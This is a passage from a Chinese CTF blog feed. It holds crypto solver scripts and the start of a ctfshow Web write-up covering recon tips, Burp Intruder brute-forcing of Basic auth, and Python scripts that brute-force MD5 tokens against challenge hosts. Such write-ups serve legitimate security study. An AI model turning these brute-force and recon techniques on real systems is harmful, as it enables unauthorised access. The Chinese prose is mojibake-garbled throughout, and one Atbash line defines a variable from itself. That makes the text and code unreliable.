class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#é‡åˆ°éå­—æ¯å°±è·³è¿‡</span></span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[a-zA-Z]&#x27;</span>, word) <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">            str_decrypt+=word</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[a-z]&#x27;</span>, word):</span><br><span class="line">            word_decrypt=<span class="built_in">chr</span>((<span class="built_in">ord</span>(word)-<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) -n) %<span class="number">26</span> +<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            word_decrypt=<span class="built_in">chr</span>((<span class="built_in">ord</span>(word)-<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) -n) %<span class="number">26</span> +<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">        str_decrypt += word_decrypt</span><br><span class="line">    res.append(str_decrypt)</span><br><span class="line">ans = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:flag <span class="keyword">in</span> x,res))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h2><span id="åŸƒç‰¹å·´ä»€ç ">åŸƒç‰¹å·´ä»€ç </span></h2><ul><li><p>å…¶åŸç†ä¸ºï¼šå®ƒä½¿ç”¨å­—æ¯è¡¨ä¸­çš„æœ€åä¸€ä¸ªå­—æ¯ä»£è¡¨ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå€’æ•°ç¬¬äºŒä¸ªå­—æ¯ä»£è¡¨ç¬¬äºŒä¸ªå­—æ¯ã€‚åœ¨ç½—é©¬å­—æ¯è¡¨ä¸­ï¼Œå®ƒæ˜¯è¿™æ ·å‡ºç°çš„ï¼š æ˜æ–‡ï¼šA B C D E F G H I J K L M N O P Q R S T U V W X Y Z å¯†æ–‡ï¼šZ Y X W V U T S R Q P O N M L K J I H G F E D C B A </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">alp = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>)]</span><br><span class="line">ALP = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>)]</span><br><span class="line">pla = alp[::-<span class="number">1</span>]</span><br><span class="line">PLA = PLA[::-<span class="number">1</span>]</span><br><span class="line">dic_a = <span class="built_in">dict</span>(<span class="built_in">zip</span>(alp,pla))</span><br><span class="line">dic = <span class="built_in">dict</span>(dic_a,**<span class="built_in">dict</span>(<span class="built_in">zip</span>(ALP,PLA)))</span><br><span class="line">words = <span class="string">&#x27;uozt&#123;Zgyzhv_xlwv_uiln_xguhsld&#125;&#x27;</span></span><br><span class="line">decypt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">    decypt += dic[w] <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[a-zA-Z]&#x27;</span>, w) <span class="keyword">else</span> w</span><br><span class="line"><span class="built_in">print</span>(decypt)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="å½“é“ºå¯†ç ">å½“é“ºå¯†ç </span></h2><ul><li><p>æ ¹æ®å½“å‰æ±‰å­—æœ‰å¤šå°‘ç¬”ç”»å‡ºå¤´ï¼Œå¯¹åº”çš„æ˜æ–‡å°±æ˜¯æ•°å­—å‡ ã€‚</p><blockquote><p>ç‹ï¼šè¯¥å­—å¤–é¢æœ‰ 6 ä¸ªå‡ºå¤´çš„ä½ç½®ï¼Œæ‰€ä»¥è¯¥æ±‰å­—å¯¹åº”çš„æ•°å­—å°±æ˜¯ 6ï¼›</p><p>å£ï¼šè¯¥å­—å¤–é¢æ²¡æœ‰å‡ºå¤´çš„ä½ç½®ï¼Œé‚£å°±æ˜¯0ï¼›</p><p>äººï¼šè¯¥å­—å¤–é¢æœ‰ 3 ä¸ªå‡ºå¤´çš„ä½ç½®ï¼Œæ‰€ä»¥è¯¥æ±‰å­—å¯¹åº”çš„æ•°å­—å°±æ˜¯ 3ï¼›</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s =<span class="string">&#x27;ç”°ç”±ä¸­äººå·¥å¤§ç‹å¤«äº•ç¾Š&#x27;</span></span><br><span class="line">en_str = <span class="string">&#x27;ç”±ç”°ä¸­ ç”±ç”°äº• ç¾Šå¤« ç”±ç”°äºº ç”±ä¸­äºº ç¾Šç¾Š ç”±ç”±ç‹ ç”±ç”°ä¸­ ç”±ç”±å¤§ ç”±ç”°å·¥ ç”±ç”±ç”± ç”±ç”±ç¾Š ç”±ä¸­å¤§&#x27;</span></span><br><span class="line">l = en_str.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> l:</span><br><span class="line">    k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> w:</span><br><span class="line">        k+=<span class="built_in">str</span>(s.index(item))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(k)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="è´¹çº³å§†å¯†ç ">è´¹çº³å§†å¯†ç </span></h2><h3><span id="crypto13">crypto13</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;/Users/disda/Desktop/è®¡ç®—æœºåŸ¹è®­/ç½‘å®‰/ctfshow/baseå®¶æ—/base.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b64decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b16decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><h2><span id="åŸ¹æ ¹å¯†ç ">åŸ¹æ ¹å¯†ç </span></h2><ol><li><p>å¯†æ–‡ä½¿ç”¨è‹±æ–‡è¯­å¥æ¥è¡¨ç¤ºä½¿ç”¨å¤§å°å†™æ¥åŒºåˆ†æ˜¯aè¿˜æ˜¯bï¼Œå¦‚æœå¯†æ–‡ä¸ºå¤§å†™é‚£ä¹ˆåŠ å¯†å°±æ˜¯ç¬¬ä¸€ç§æ–¹å¼ä½¿ç”¨å¯†æ–‡çš„æ¯ä¸ªå­—æ¯å¤§å°å†™æ¥åˆ¤å®šæ˜¯aè¿˜æ˜¯bï¼ˆå¤§å†™ä¸ºa,å°å†™ä¸ºbï¼‰â€”å•æ–‡æœ¬è¯­å¥æ¨¡å¼</p></li><li><p>å¯†æ–‡ä½¿ç”¨è‹±æ–‡è¯­å¥ä½¿ç”¨ä¸¤ç§ä¸åŒçš„Â·å­—ä½“æ¥åŒºåˆ†a,bé€šå¸¸(å°†ç¬¬ä¸€ç§å­—ä½“è½¬æ¢ä¸ºaï¼Œç¬¬äºŒç§å­—ä½“è½¬æ¢ä¸ºb)</p></li></ol><h3><span id="èŒæ–°-å¯†ç 3">èŒæ–° å¯†ç 3</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®åç§°ï¼šæˆ‘æƒ³åƒåŸ¹æ ¹ é¢˜ç›®æè¿°ï¼š -- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. /-- -.. -- -.. -.. --/ -- -- -- -- -- /-- -.. -.. -- -.. -- /-- -.. -.. -- æ ¼å¼ï¼šflag&#123;***********&#125;</span><br></pre></td></tr></table></figure><p>æ”¾å…¥CyberChefä¸­è·å¾—</p><p><code>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</code></p><p>ç„¶åå°†Mæ¢æˆAï¼ŒDæ¢æˆBï¼Œè§£ç é€‰æ‹©Completeè·å¾—<code>GUOWANG</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-Webç¯‡</title>
      <link href="/2023/04/19/ctfshow-Web%E7%AF%87/"/>
      <url>/2023/04/19/ctfshow-Web%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#web%E5%85%A5%E9%97%A8">WEBå…¥é—¨</a><ul><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ä¿¡æ¯æ”¶é›†</a><ul><li><a href="#web05">web05</a></li><li><a href="#web10">web10</a></li><li><a href="#web12">web12</a></li><li><a href="#web13">web13</a></li><li><a href="#web14">web14</a></li><li><a href="#web15">web15</a></li><li><a href="#web16">web16</a></li><li><a href="#web20">web20</a></li></ul></li><li><a href="#%E7%88%86%E7%A0%B4">çˆ†ç ´</a><ul><li><a href="#web21">web21</a></li><li><a href="#web22">web22</a></li><li><a href="#web23">web23</a></li><li><a href="#web25">web25</a></li><li><a href="#web28">web28</a></li></ul></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">å‘½ä»¤æ‰§è¡Œ</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB">å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ±‡æ€»</a></li><li><a href="#web37">web37</a></li><li><a href="#web41">web41</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%88%AA%E6%96%AD">å‘½ä»¤æˆªæ–­</a></li><li><a href="#web54">web54</a></li><li><a href="#web55">web55</a></li><li><a href="#web57">web57</a></li><li><a href="#web58">web58</a></li><li><a href="#web71">web71</a></li><li><a href="#web72">web72</a></li><li><a href="#web73">web73</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«</a><ul><li><a href="#web80">web80</a></li><li><a href="#web83">web83</a></li><li><a href="#web87">web87</a></li></ul></li><li><a href="#php%E7%89%B9%E6%80%A7">phpç‰¹æ€§</a><ul><li><a href="#web89">web89</a></li><li><a href="#web90">web90</a></li><li><a href="#web91">web91</a></li><li><a href="#web93">web93</a></li><li><a href="#web94">web94</a></li><li><a href="#web97">web97</a></li><li><a href="#web99">web99</a></li><li><a href="#web100">web100</a></li><li><a href="#web105">web105</a></li><li><a href="#web108">web108</a></li><li><a href="#web109">web109</a></li><li><a href="#web110">web110</a></li><li><a href="#web111">web111</a></li><li><a href="#web112">web112</a></li><li><a href="#web113">web113</a></li><li><a href="#web123">web123</a></li><li><a href="#web127">web127</a></li><li><a href="#web129">web129</a></li><li><a href="#web131">web131</a></li><li><a href="#web134">web134</a></li><li><a href="#web136">web136</a></li><li><a href="#web141">web141</a></li><li><a href="#web147">web147</a></li><li><a href="#web149">web149</a></li><li><a href="#web150">web150</a></li><li><a href="#web150plus">web150plus</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">æ–‡ä»¶ä¸Šä¼ </a><ul><li><a href="#web153">web153</a></li><li><a href="#web156">web156</a></li><li><a href="#web157">web157</a></li><li><a href="#web-159">web 159</a></li><li><a href="#web-160">web 160</a></li><li><a href="#web162">web162</a></li><li><a href="#web-164">web 164</a></li><li><a href="#web-165">web 165</a></li><li><a href="#web166">web166</a></li><li><a href="#web167">web167</a></li><li><a href="#web-168">web 168</a></li><li><a href="#web169">web169</a></li></ul></li><li><a href="#sql-%E6%B3%A8%E5%85%A5">SQL æ³¨å…¥</a><ul><li><a href="#web171">web171</a></li><li><a href="#web172">web172</a></li><li><a href="#web174">web174</a></li><li><a href="#web175">web175</a></li><li><a href="#web176">web176</a></li><li><a href="#web177">web177</a></li><li><a href="#web179">web179</a></li><li><a href="#web180">web180</a></li><li><a href="#web183">web183</a></li><li><a href="#web184">web184</a></li><li><a href="#web185">web185</a></li><li><a href="#web187">web187</a></li><li><a href="#web-188">web 188</a></li><li><a href="#web189">web189</a></li><li><a href="#web190">web190</a></li><li><a href="#web191">web191</a></li><li><a href="#web192">web192</a></li><li><a href="#web193">web193</a></li><li><a href="#web195">web195</a></li><li><a href="#web196">web196</a></li><li><a href="#web197">web197</a></li><li><a href="#web198">web198</a></li><li><a href="#web-201">web 201</a></li><li><a href="#web202">web202</a></li><li><a href="#web203">web203</a></li><li><a href="#web-204">web 204</a></li><li><a href="#web-205">web 205</a></li><li><a href="#web206">web206</a></li><li><a href="#web207">web207</a></li><li><a href="#web-207">web 207</a></li><li><a href="#web209">Web209</a></li><li><a href="#web210">web210</a></li><li><a href="#web212">Web212</a></li><li><a href="#web213">web213</a></li><li><a href="#web214">web214</a></li><li><a href="#web-215">web 215</a></li><li><a href="#web-216">web 216</a></li><li><a href="#web-217">web 217</a></li><li><a href="#web218">web218</a></li><li><a href="#web220">web220</a></li><li><a href="#web221">web221</a></li><li><a href="#web222">web222</a></li><li><a href="#web223">web223</a></li><li><a href="#web225">web225</a></li><li><a href="#web226">web226</a></li><li><a href="#web227">web227</a></li></ul></li></ul></li><li><a href="#%E6%84%9A%E4%BA%BA%E8%8A%82%E6%9D%AF">æ„šäººèŠ‚æ¯</a><ul><li><a href="#web">WEB</a><ul><li><a href="#easy_signin">easy_signin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="webå…¥é—¨">WEBå…¥é—¨</span></h1><h3><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h3><h4><span id="web05">web05</span></h4><p>phpsæ³„éœ²ï¼Œphpså­˜æ”¾ç€php<a href="https://so.csdn.net/so/search?q=%E6%BA%90%E7%A0%81&spm=1001.2101.3001.7020">æºç </a>,å¯é€šè¿‡å°è¯•è®¿é—®&#x2F;index.phpsè¯»å–,æˆ–è€…å°è¯•æ‰«æå·¥å…·æ‰«æè¯»å–ã€‚</p><h4><span id="web10">web10</span></h4><p>flagä¿¡æ¯è—åœ¨dnsè®°å½•é‡Œé¢ï¼Œä½¿ç”¨å‘½ä»¤</p><p><a href="http://dbcha.com/">åŸŸåæŸ¥è¯¢</a></p><h4><span id="web12">web12</span></h4><ul><li><p>æœ‰æ—¶å€™è®¿é—®è·¯å¾„åœ¨*&#x2F;robots.txt*é‡Œé¢</p></li><li><p>å¸¸è§çš„ç®¡ç†å‘˜é¡µé¢è·¯å¾„ï¼š</p><ul><li>&#x2F;admin.php</li><li>&#x2F;admin</li></ul></li></ul><h4><span id="web13">web13</span></h4><p>é¢˜ç›®æç¤ºäº†è¦æŸ¥çœ‹æ–‡æ¡£ï¼Œf12ç²—ç•¥çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡ä»€ä¹ˆçº¿ç´¢ã€‚</p><p>é€šè¿‡dirsearchä¹Ÿæ‰«ä¸åˆ°ï¼Œçœ‹äº†ä¸€ä¸‹æç¤ºï¼Œè¯´æ˜¯è¦æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œç„¶åæŸ¥æ‰¾ä¸€ä¸‹documentå…³é”®å­—ï¼Œæœç„¶å‘ç°äº†ä¸ªdocument.pdfã€‚</p><h4><span id="web14">web14</span></h4><p>çœ‹äº†åŠå¤©æºç ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œçœ‹äº†ä¸€ä¸‹robots.txtä¹Ÿæ²¡æœ‰ï¼Œå†ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸ªeditorç›®å½•ï¼Œè®¿é—®é“¾æ¥å‘ç°äº†ä¸€ä¸ªç¼–è¾‘å™¨ã€‚</p><p>ç„¶ååˆ©ç”¨ç¼–è¾‘å™¨ä¸Šä¼ çš„åŠŸèƒ½ï¼Œå‘ç°flagæ–‡ä»¶<code>editor/attached/file/var/www/html/nothinghere/fl000g.txt</code></p><p>æœ€åè®¿é—®**&#x2F;nothinghere&#x2F;fl000g.txt**å³å¯</p><h4><span id="web15">web15</span></h4><p>è¦æœ‰ç¤¾å·¥çš„æ„è¯†ï¼Œæœ‰é‚®ç®±çš„ä¿¡æ¯å°±å¯ä»¥å»æŸ¥å…¶ä»–ä¿¡æ¯ã€‚</p><h4><span id="web16">web16</span></h4><p>phpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ &#x2F;tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆï¼Œç„¶åæŸ¥çœ‹phpinfoæœç´¢flag</p><ul><li>chromeçš„wappalyzerå¯ä»¥æŸ¥çœ‹ç½‘é¡µçš„æ¡†æ¶å’Œè¯­è¨€ï¼Œå¯ä»¥å‘ç°æ˜¯php</li></ul><h4><span id="web20">web20</span></h4><ul><li>accessæ•°æ®åº“åœ¨&#x2F;db&#x2F;db.mdb</li></ul><h3><span id="çˆ†ç ´">çˆ†ç ´</span></h3><h4><span id="web21">web21</span></h4><p>BurpSuitå¯ä»¥æœ‰å¤šç§åšæ³•ï¼š</p><p>æˆ‘ä»¬éšä¾¿è¾“å…¥è´¦å·å¯†ç æŠ“åŒ…æ—¶å€™å‘ç°Authorizationä¸­æ˜¯ä»¥base64è¿›è¡ŒåŠ å¯†çš„ï¼Œè§£å¯†ä¸ºadmin:123ï¼Œå¯èƒ½è¿™æ ·è¿˜æ¯”è¾ƒéš¾çœ‹å‡ºæ¥ï¼Œå¯ä»¥æŠŠå¯†ç åŠ é•¿ä¸€ç‚¹è¯•è¯•çœ‹ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>02cc98c2-f4b7-41b3-8b16-7b9a96655edb.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46MTIz</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><ul><li><p>ç¬¬ä¸€ç§ï¼Œè´¦å·å¯†ç åˆ†å¼€ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic Â§Â§Â§Â§</span><br></pre></td></tr></table></figure><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162915401.png" alt="image-20230423162915401"></p></li></ul><p>â€‹     <img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162935303.png" alt="image-20230423162935303"></p><p>ç¬¬äºŒä¸ªä½ç½®åŠ å…¥å¯†ç æœ¬ï¼Œç„¶åå…¶ä»–åŒç†ã€‚</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230423162626843.png" alt="image-20230423162626843"></p><ul><li><p>æ–¹æ³•äºŒï¼šå¯ä»¥ç›´æ¥ä¿ç•™admin:çš„base64ç¼–ç ï¼Œç„¶åæ”¾åœ¨payloadå‰é¢</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46Â§Â§</span><br></pre></td></tr></table></figure></li></ul><p>â€‹å› æ­¤ï¼Œåªéœ€è¦ä¸€ä¸ªsimple listå³å¯</p><ul><li>æ–¹æ³•ä¸‰ï¼šæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨<em>payload type &#x3D; Custom iterator</em>æ„é€ ä¸‰æ¬¡å‚æ•°<ul><li>ç¬¬ä¸€æ¬¡è¾“å…¥admin</li><li>ç¬¬äºŒæ¬¡è¾“å…¥:</li><li>ç¬¬ä¸‰æ¬¡å¯†ç å­—å…¸</li></ul></li></ul><h4><span id="web22">web22</span></h4><p><a href="http://z.zcjun.com/">å­åŸŸåçˆ†ç ´</a></p><h4><span id="web23">web23</span></h4><p>é˜…è¯»phpæºç ï¼Œç„¶åå†™pythonè„šæœ¬</p><ul><li><strong>MD5åŠ å¯†</strong>ï¼šäº§ç”Ÿå‡ºä¸€ä¸ª128ä½ï¼ˆ16å­—èŠ‚ï¼‰çš„æ•£åˆ—å€¼ï¼ˆhash valueï¼‰ï¼Œç”¨äºç¡®ä¿ä¿¡æ¯ä¼ è¾“å®Œæ•´ä¸€è‡´ã€‚ç”Ÿæˆç»“æœæ˜¯å›ºå®šçš„128å­—èŠ‚ï¼Œé€šå¸¸ç”¨ä¸€ä¸ª32ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</li><li><strong>PHP</strong>ï¼šsubstr()ã€intval()ã€ä»¥åŠä»£ç åˆ†æ</li></ul><p>ç¬¬ä¸€ç§æ–¹å¼ï¼Œå­—æ¯åŠ æ•°å­—ç»„åˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">s = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">url = <span class="string">&#x27;http://7f0d474e-c019-4af7-8f95-b02664aa0411.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        k = (<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3ä¸­å¿…é¡»è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">        token = hashlib.md5(k).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">                right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">                <span class="keyword">if</span> left == right:</span><br><span class="line">                    <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;<span class="built_in">str</span>(i)+<span class="built_in">str</span>(j)&#125;</span>&#x27;</span>).text)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹å¼ï¼Œçº¯æ•°å­—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://61535773-6957-4813-b084-0451f6607922.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    k = <span class="built_in">str</span>(j).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3ä¸­å¿…é¡»è¿›è¡Œutf-8ç¼–ç </span></span><br><span class="line">    token = hashlib.md5(k).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">            right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">            <span class="keyword">if</span> left == right:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;j&#125;</span>&#x27;</span>).text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h4><span id="web25">web25</span></h4><ul><li><p>å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œéƒ½æ˜¯åˆ©ç”¨phpéšæœºæ•°çš„çˆ†ç ´æ”»å‡»ï¼Œä½†æ˜¯æœ¬é¢˜æ²¡æœ‰ç»™ç§å­ï¼Œå› æ­¤éœ€è¦éœ€è¦ä½¿ç”¨å·¥å…· <a href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a> 